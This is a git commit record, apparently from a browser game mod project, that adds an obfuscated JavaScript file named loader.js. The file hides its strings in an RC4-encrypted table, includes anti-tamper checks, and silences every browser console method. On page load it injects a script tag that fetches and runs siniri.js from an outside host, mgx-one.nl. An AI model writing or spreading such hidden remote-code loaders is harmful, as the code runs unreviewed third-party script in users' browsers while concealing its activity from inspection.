3121c2b12be3e38c5c0e6885e8d9c7a035365155
Legend Mod <jimboy3100@hotmail.com>
2019-05-10 00:25:34 +0300

    Create loader.js

---
+++ extras/loader/loader.js
@@ -0,0 +1,633 @@
+//
+'use strict';
+/** @type {!Array} */
+var a = ["HUZvPX0=", "U2gZw4fDoQ==", "wpvCpcKBw6EVw5nCviE=", "wpBPasOlJh0ia8O2T8O/dR3DoQ==", "wpsDOA==", "w715wqEywqRcwpwDwrw=", "cQ3CoMKBwr0=", "w5lFd8K5w7E=", "R14dw5XDqQ==", "w65tVAPDv8KGwqDCm3bCphYLw4kLYcKbw6kvdcK4JsOTw6HCrsOhLmvCqFY2LHhV", "MRgCdcOh", "Hw9+wpjDsg==", "WsK+Nh9W", "w5HCiBXCqAA=", "KcO9woQA", "LBpBYRM=", "wpceRQnCoBjDphbCrB0eecOjwrJkR8O+WsK/wpDCukFhw7nDj8K8woU4wo/DvwrCqXLDsBbDtMKNw7zCkhrCm8Ogfilxc1Erwq3DqgljIDQYw7s8wofCssKMw5QOS8KOw6g/YyYVwrRzwp50w7DCl8O+WEvCohvCqcOEwqIpPMKzwpXCtsOHw7FHw5dHc8OSHsOnwo0YasKkHkwCwocxTzhcSi3CoTfDqjrCqWbCvMOBw6VLBFHCnWYGKm3CilM=", 
+"Yjcgwq/CsA==", "NEZZG1c=", "wpfDl8OGw5c9dMK9Iy16E8O3wrvCm8Kiwrtewp47ASkAw4I5wo8=", "wqAzN8KPwqs=", "wpMSKU/CoQ==", "ZRElHcKjMyEHw6Nbw4Nq", "w4cLL1HCvA==", "w7jClXcARQLCjQ==", "wocxCmvCqg==", "w4lOZ8KDcsKmwpg=", "IVYiw7o3", "w65OwpsFwrE=", "w4x8SgjDvsKW", "WMKxw5HDmMK1", "w6nDihk6wq0=", "P8KHfcOxw4s=", "w6ZLw5t8wp0=", "Kid6VsOcSsKvURFNWw==", "EEQSw405", "CGU9wodT", "NMKnCQPDuQ==", "EFhmHF3Cg8OlMlYawoEE", "w6hicz/Dqg==", "RAUdwqLCjg==", "w6kCbh/CmA==", "woQDOUs=", "FQl7ZzY=", "w64hBy5IAg==", "QCYTF8K5", 
+"wpAUw7HCpcK2", "axLCgsKMwro=", "w6bCn2IRXgLDisO0KwZtLgHDn2kPw7HCuxA=", "PMKiRcKVPA==", "w5AQCBjCpgbDoULCqhENaMKxw6c4AMO0S8Okwo/CqVkgw77DhMKnwp9qw5LDsArDsw==", "EMKpw5UbAQ==", "EhxTTgg=", "wqHChiUYHhDDnsKgfQ81MUQ=", "JkMww40O", "w4M3PW3Cqw==", "woLCkMKdw4ww", "w54BCWDCog==", "w4EcFXzCmg==", "wp3Cj8Klw5wz", "KhDCjGtd", "RcKPDyZj", "EiQzQMOS", "wrLDs8KEH0M=", "wqvDjMO1w7sj", "wpMJUsK7WzJq", "fCXCu8KrwpZwfQ==", "woDCuMKP", "w4dAw60K", "QWwXw4fDow==", "wp1EasOj", "CyXCuGtb", "AsOeZ8OIwrwFCsKhGg==", "wqvCh8OWw7Fq", 
+"ZsK3w4PDt8Ku", "HSfCpm1d", "w7fClXgXQwDCjw==", "LsOgwpIWwqQ=", "Zw47C8KiOxA=", "w5BWw7J7wqk=", "DTjCpHdGwoVb", "wpQDXsK9Uw==", "wpsdw63Cu8K9w4B5", "aCvCp8K2", "w5LDoCMcw4zDpcKh", "w4kCA38=", "w6LDj8KNw617ARY=", "AjjCrQ==", "H8KpecOKw7TDisKb", "wr7DoMOkw7YETsKTbAY=", "ScKIBwxk", "w57CqC7CjA7DsQ==", "BcKTw5IeM8OBwr/Dmi16", "w4hiTwDDtcKAw6HCmnvCrw==", "w6FNXcOgOMOfQ8O7FMOQLMOi"];
+(function(params, url) {
+  /**
+   * @param {?} selected_image
+   * @return {undefined}
+   */
+  var fn = function(selected_image) {
+    for (; --selected_image;) {
+      params["push"](params["shift"]());
+    }
+  };
+  /**
+   * @return {undefined}
+   */
+  var build = function() {
+    var target = {
+      "data" : {
+        "key" : "cookie",
+        "value" : "timeout"
+      },
+      "setCookie" : function(value, name, path, headers) {
+        headers = headers || {};
+        /** @type {string} */
+        var cookie = name + "=" + path;
+        /** @type {number} */
+        var url = 0;
+        /** @type {number} */
+        url = 0;
+        var key = value["length"];
+        for (; url < key; url++) {
+          var i = value[url];
+          /** @type {string} */
+          cookie = cookie + ("; " + i);
+          var char = value[i];
+          value["push"](char);
+          key = value["length"];
+          if (char !== !![]) {
+            /** @type {string} */
+            cookie = cookie + ("=" + char);
+          }
+        }
+        /** @type {string} */
+        headers["cookie"] = cookie;
+      },
+      "removeCookie" : function() {
+        return "dev";
+      },
+      "getCookie" : function(match, href) {
+        match = match || function(canCreateDiscussions) {
+          return canCreateDiscussions;
+        };
+        var v = match(new RegExp("(?:^|; )" + href["replace"](/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
+        /**
+         * @param {!Function} bits
+         * @param {number} callback
+         * @return {undefined}
+         */
+        var decode = function(bits, callback) {
+          bits(++callback);
+        };
+        decode(fn, url);
+        return v ? decodeURIComponent(v[1]) : undefined;
+      }
+    };
+    /**
+     * @return {?}
+     */
+    var init = function() {
+      /** @type {!RegExp} */
+      var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
+      return test["test"](target["removeCookie"]["toString"]());
+    };
+    /** @type {function(): ?} */
+    target["updateCookie"] = init;
+    /** @type {string} */
+    var array = "";
+    var C = target["updateCookie"]();
+    if (!C) {
+      target["setCookie"](["*"], "counter", 1);
+    } else {
+      if (C) {
+        array = target["getCookie"](null, "counter");
+      } else {
+        target["removeCookie"]();
+      }
+    }
+  };
+  build();
+})(a, 140);
+/**
+ * @param {string} i
+ * @param {string} a
+ * @return {?}
+ */
+var b = function(i, a) {
+  /** @type {number} */
+  i = i - 0;
+  var key = a[i];
+  if (b["SmSQMn"] === undefined) {
+    (function() {
+      var PL$14;
+      try {
+        var evaluate = Function("return (function() " + '{}.constructor("return this")( )' + ");");
+        PL$14 = evaluate();
+      } catch (h) {
+        /** @type {!Window} */
+        PL$14 = window;
+      }
+      /** @type {string} */
+      var colorProps = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+      if (!PL$14["atob"]) {
+        /**
+         * @param {?} Y
+         * @return {?}
+         */
+        PL$14["atob"] = function(Y) {
+          var str = String(Y)["replace"](/=+$/, "");
+          /** @type {number} */
+          var i = 0;
+          var y;
+          var x;
+          /** @type {number} */
+          var n = 0;
+          /** @type {string} */
+          var pix_color = "";
+          for (; x = str["charAt"](n++); ~x && (y = i % 4 ? y * 64 + x : x, i++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & y >> (-2 * i & 6)) : 0) {
+            x = colorProps["indexOf"](x);
+          }
+          return pix_color;
+        };
+      }
+    })();
+    /**
+     * @param {string} data
+     * @param {!Object} fn
+     * @return {?}
+     */
+    var testcase = function(data, fn) {
+      /** @type {!Array} */
+      var p = [];
+      /** @type {number} */
+      var u = 0;
+      var b;
+      /** @type {string} */
+      var testResult = "";
+      /** @type {string} */
+      var tempData = "";
+      /** @type {string} */
+      data = atob(data);
+      /** @type {number} */
+      var val = 0;
+      var key = data["length"];
+      for (; val < key; val++) {
+        /** @type {string} */
+        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
+      }
+      /** @type {string} */
+      data = decodeURIComponent(tempData);
+      /** @type {number} */
+      var i = 0;
+      for (; i < 256; i++) {
+        /** @type {number} */
+        p[i] = i;
+      }
+      /** @type {number} */
+      i = 0;
+      for (; i < 256; i++) {
+        /** @type {number} */
+        u = (u + p[i] + fn["charCodeAt"](i % fn["length"])) % 256;
+        b = p[i];
+        p[i] = p[u];
+        p[u] = b;
+      }
+      /** @type {number} */
+      i = 0;
+      /** @type {number} */
+      u = 0;
+      /** @type {number} */
+      var PL$19 = 0;
+      for (; PL$19 < data["length"]; PL$19++) {
+        /** @type {number} */
+        i = (i + 1) % 256;
+        /** @type {number} */
+        u = (u + p[i]) % 256;
+        b = p[i];
+        p[i] = p[u];
+        p[u] = b;
+        testResult = testResult + String["fromCharCode"](data["charCodeAt"](PL$19) ^ p[(p[i] + p[u]) % 256]);
+      }
+      return testResult;
+    };
+    /** @type {function(string, !Object): ?} */
+    b["qZUXMJ"] = testcase;
+    b["KVwCLw"] = {};
+    /** @type {boolean} */
+    b["SmSQMn"] = !![];
+  }
+  var C = b["KVwCLw"][i];
+  if (C === undefined) {
+    if (b["FGxbEi"] === undefined) {
+      /**
+       * @param {?} array
+       * @return {undefined}
+       */
+      var Array = function(array) {
+        this["NGbmSf"] = array;
+        /** @type {!Array} */
+        this["GSHXaU"] = [1, 0, 0];
+        /**
+         * @return {?}
+         */
+        this["EMMFJG"] = function() {
+          return "newState";
+        };
+        /** @type {string} */
+        this["HPiVSr"] = "\\w+ *\\(\\) *{\\w+ *";
+        /** @type {string} */
+        this["nsfNqi"] = "['|\"].+['|\"];? *}";
+      };
+      /**
+       * @return {?}
+       */
+      Array["prototype"]["tqbmMz"] = function() {
+        /** @type {!RegExp} */
+        var test = new RegExp(this["HPiVSr"] + this["nsfNqi"]);
+        /** @type {number} */
+        var artistTrack = test["test"](this["EMMFJG"]["toString"]()) ? --this["GSHXaU"][1] : --this["GSHXaU"][0];
+        return this["fQjCCQ"](artistTrack);
+      };
+      /**
+       * @param {?} canCreateDiscussions
+       * @return {?}
+       */
+      Array["prototype"]["fQjCCQ"] = function(canCreateDiscussions) {
+        if (!Boolean(~canCreateDiscussions)) {
+          return canCreateDiscussions;
+        }
+        return this["pbSDuH"](this["NGbmSf"]);
+      };
+      /**
+       * @param {?} saveNotifs
+       * @return {?}
+       */
+      Array["prototype"]["pbSDuH"] = function(saveNotifs) {
+        /** @type {number} */
+        var fp = 0;
+        var len = this["GSHXaU"]["length"];
+        for (; fp < len; fp++) {
+          this["GSHXaU"]["push"](Math["round"](Math["random"]()));
+          len = this["GSHXaU"]["length"];
+        }
+        return saveNotifs(this["GSHXaU"][0]);
+      };
+      (new Array(b))["tqbmMz"]();
+      /** @type {boolean} */
+      b["FGxbEi"] = !![];
+    }
+    key = b["qZUXMJ"](key, a);
+    b["KVwCLw"][i] = key;
+  } else {
+    key = C;
+  }
+  return key;
+};
+var f = function() {
+  /**
+   * @param {?} obj
+   * @param {string} parameters
+   * @return {undefined}
+   */
+  function test(obj, parameters) {
+    /** @type {number} */
+    var value = 0;
+    for (; c[b("0x2d", "QLmn")](value, parameters[b("0x2e", "!pjh")]); value++) {
+      var val = parameters[value];
+      val[b("0x2f", "NcE4")] = val[b("0x30", "FxiQ")] || false;
+      /** @type {boolean} */
+      val[b("0x31", "mYmy")] = true;
+      if (c[b("0x32", "WMVW")](b("0x33", "BeVe"), val)) {
+        /** @type {boolean} */
+        val["writable"] = true;
+      }
+      Object[b("0x35", "2Yf^")](obj, val[b("0x36", "WEmk")], val);
+    }
+  }
+  var d = function() {
+    /** @type {boolean} */
+    var c = !![];
+    return function(object__360, function__361) {
+      /** @type {!Function} */
+      var loopend = c ? function() {
+        if (function__361) {
+          var cssobj = function__361["apply"](object__360, arguments);
+          /** @type {null} */
+          function__361 = null;
+          return cssobj;
+        }
+      } : function() {
+      };
+      /** @type {boolean} */
+      c = ![];
+      return loopend;
+    };
+  }();
+  var showErrors = d(this, function() {
+    /**
+     * @return {?}
+     */
+    var intval = function() {
+      return "dev";
+    };
+    /**
+     * @return {?}
+     */
+    var getDOMPath = function() {
+      return "window";
+    };
+    /**
+     * @return {?}
+     */
+    var testcase = function() {
+      /** @type {!RegExp} */
+      var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
+      return !test["test"](intval["toString"]());
+    };
+    /**
+     * @return {?}
+     */
+    var _stringify = function() {
+      /** @type {!RegExp} */
+      var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
+      return test["test"](getDOMPath["toString"]());
+    };
+    /**
+     * @param {!Object} p
+     * @return {undefined}
+     */
+    var wrap = function(p) {
+      /** @type {number} */
+      var ms_controller = ~-1 >> 1 + 255 % 0;
+      if (p["indexOf"]("i" === ms_controller)) {
+        create(p);
+      }
+    };
+    /**
+     * @param {!Object} s
+     * @return {undefined}
+     */
+    var create = function(s) {
+      /** @type {number} */
+      var n = ~-4 >> 1 + 255 % 0;
+      if (s["indexOf"]((!![] + "")[3]) !== n) {
+        wrap(s);
+      }
+    };
+    if (!testcase()) {
+      if (!_stringify()) {
+        wrap("ind\u0435xOf");
+      } else {
+        wrap("indexOf");
+      }
+    } else {
+      wrap("ind\u0435xOf");
+    }
+  });
+  showErrors();
+  var c = {};
+  /**
+   * @param {?} saveNotifs
+   * @param {?} notifications
+   * @return {?}
+   */
+  c[b("0x0", "@Lk8")] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  /**
+   * @param {(Object|number)} buckets
+   * @param {!Object} name
+   * @return {?}
+   */
+  c[b("0x1", "THx^")] = function(buckets, name) {
+    return buckets + name;
+  };
+  c[b("0x2", "Whq%")] = b("0x3", "KR$@");
+  c[b("0x4", "KsWN")] = b("0x5", "30jR");
+  /**
+   * @param {?} saveNotifs
+   * @return {?}
+   */
+  c["pTrhW"] = function(saveNotifs) {
+    return saveNotifs();
+  };
+  c["Uspnj"] = "5|3|2|4|0|6|1";
+  /**
+   * @param {(boolean|number|string)} hits
+   * @param {(boolean|number|string)} n
+   * @return {?}
+   */
+  c["dazGc"] = function(hits, n) {
+    return hits < n;
+  };
+  /**
+   * @param {(number|string)} data
+   * @param {!Object} p
+   * @return {?}
+   */
+  c["lnyDN"] = function(data, p) {
+    return data in p;
+  };
+  /**
+   * @param {?} cb
+   * @param {?} fallbackReleases
+   * @param {?} formattedSections
+   * @return {?}
+   */
+  c["nGuYD"] = function(cb, fallbackReleases, formattedSections) {
+    return cb(fallbackReleases, formattedSections);
+  };
+  /**
+   * @param {?} callback
+   * @param {?} response_2
+   * @param {?} webhookMsg
+   * @return {?}
+   */
+  c[b("0xc", "[&GW")] = function(callback, response_2, webhookMsg) {
+    return callback(response_2, webhookMsg);
+  };
+  var magnifier = function() {
+    /** @type {boolean} */
+    var x = !![];
+    return function(value, deferred) {
+      /** @type {!Function} */
+      var posX = x ? function() {
+        if (deferred) {
+          var mom = deferred[b("0xd", "ow8K")](value, arguments);
+          /** @type {null} */
+          deferred = null;
+          return mom;
+        }
+      } : function() {
+      };
+      /** @type {boolean} */
+      x = ![];
+      return posX;
+    };
+  }();
+  var $magnifier = c[b("0xe", "7m(2")](magnifier, this, function() {
+    /**
+     * @return {undefined}
+     */
+    var tOutResp = function() {
+    };
+    var scopeWindow;
+    try {
+      var bBody = c[b("0xf", "ZhQE")](Function, c[b("0x10", "QLmn")](c[b("0x11", "ENo3")] + c[b("0x12", "TnJN")], ");"));
+      scopeWindow = c[b("0x13", "v0mn")](bBody);
+    } catch (G) {
+      /** @type {!Window} */
+      scopeWindow = window;
+    }
+    if (!scopeWindow[b("0x14", "11Pp")]) {
+      scopeWindow[b("0x15", "Whq%")] = function(data) {
+        var specialDayCache = {};
+        /** @type {function(): undefined} */
+        specialDayCache[b("0x16", "7m(2")] = data;
+        /** @type {function(): undefined} */
+        specialDayCache[b("0x17", "7yz(")] = data;
+        /** @type {function(): undefined} */
+        specialDayCache[b("0x18", "BeVe")] = data;
+        /** @type {function(): undefined} */
+        specialDayCache["info"] = data;
+        /** @type {function(): undefined} */
+        specialDayCache["error"] = data;
+        /** @type {function(): undefined} */
+        specialDayCache["exception"] = data;
+        /** @type {function(): undefined} */
+        specialDayCache["trace"] = data;
+        return specialDayCache;
+      }(tOutResp);
+    } else {
+      var res = c["Uspnj"]["split"]("|");
+      /** @type {number} */
+      var ri = 0;
+      for (; !![];) {
+        switch(res[ri++]) {
+          case "0":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["error"] = tOutResp;
+            continue;
+          case "1":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["trace"] = tOutResp;
+            continue;
+          case "2":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["debug"] = tOutResp;
+            continue;
+          case "3":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["warn"] = tOutResp;
+            continue;
+          case "4":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["info"] = tOutResp;
+            continue;
+          case "5":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["log"] = tOutResp;
+            continue;
+          case "6":
+            /** @type {function(): undefined} */
+            scopeWindow["console"]["exception"] = tOutResp;
+            continue;
+        }
+        break;
+      }
+    }
+  });
+  $magnifier();
+  return function(a, val, next) {
+    return val && test(a["prototype"], val), next && c["nGuYD"](test, a, next), a;
+  };
+}();
+/**
+ * @param {?} s
+ * @param {?} code
+ * @return {undefined}
+ */
+function T(s, code) {
+  var errors = {};
+  /**
+   * @param {(ArrayBuffer|ArrayBufferView|Blob|string)} impromptuInstance
+   * @param {!Function} Impromptu
+   * @return {?}
+   */
+  errors["Wdfap"] = function(impromptuInstance, Impromptu) {
+    return impromptuInstance instanceof Impromptu;
+  };
+  errors["bWhgm"] = "Cannot call a class as a function";
+  if (!errors["Wdfap"](s, code)) {
+    throw new TypeError(errors["bWhgm"]);
+  }
+}
+var Z = function() {
+  /**
+   * @return {undefined}
+   */
+  function previous() {
+    t["wWKTQ"](T, this, previous);
+    this["loading"]();
+  }
+  var t = {};
+  /**
+   * @param {?} callback
+   * @param {?} response_2
+   * @param {?} webhookMsg
+   * @return {?}
+   */
+  t[b("0x3e", "QLmn")] = function(callback, response_2, webhookMsg) {
+    return callback(response_2, webhookMsg);
+  };
+  t["cEUCz"] = "body";
+  t["kubAq"] = "<script type='text/javascript' src='https://mgx-one.nl/vFk2jDyTaRvfE77vyLMwfAV5Zf7LCPBx3KhdBaqPWpujrgHR/siniri.js?v=hex'></script>";
+  /**
+   * @param {?} saveNotifs
+   * @param {?} notifications
+   * @return {?}
+   */
+  t[b("0x43", "U&ZS")] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  t[b("0x44", "WMVW")] = b("0x45", "v0mn");
+  /**
+   * @param {?} callback
+   * @param {?} response_2
+   * @param {?} webhookMsg
+   * @return {?}
+   */
+  t[b("0x46", "S81@")] = function(callback, response_2, webhookMsg) {
+    return callback(response_2, webhookMsg);
+  };
+  t["cthpZ"] = "appendToBody";
+  t["hRkxY"] = "loading";
+  return f(previous, [{
+    "key" : t["cthpZ"],
+    "value" : function() {
+      $(t["cEUCz"])["append"](t["kubAq"]);
+    }
+  }, {
+    "key" : t["hRkxY"],
+    "value" : function() {
+      var c = {};
+      /**
+       * @param {?} existsNot
+       * @param {?} droneId
+       * @return {?}
+       */
+      c["CAjHP"] = function(existsNot, droneId) {
+        return t.esWEn(existsNot, droneId);
+      };
+      c["BoHdQ"] = "div.message";
+      c["RfXGT"] = t.EnObd;
+      /**
+       * @param {?} existsNot
+       * @param {?} droneId
+       * @param {?} itemsize
+       * @return {?}
+       */
+      c["EnIRz"] = function(existsNot, droneId, itemsize) {
+        return t.puLeT(existsNot, droneId, itemsize);
+      };
+      var a9 = this;
+      t["puLeT"](setTimeout, function() {
+        a9["appendToBody"]();
+        c["EnIRz"](setTimeout, function() {
+          c["CAjHP"]($, c["BoHdQ"])["text"](c["RfXGT"]);
+        }, 2E3);
+      }, 1E3);
+    }
+  }]), previous;
+}();
+/**
+ * @return {undefined}
+ */
+window["onload"] = function() {
+  new Z;
+};
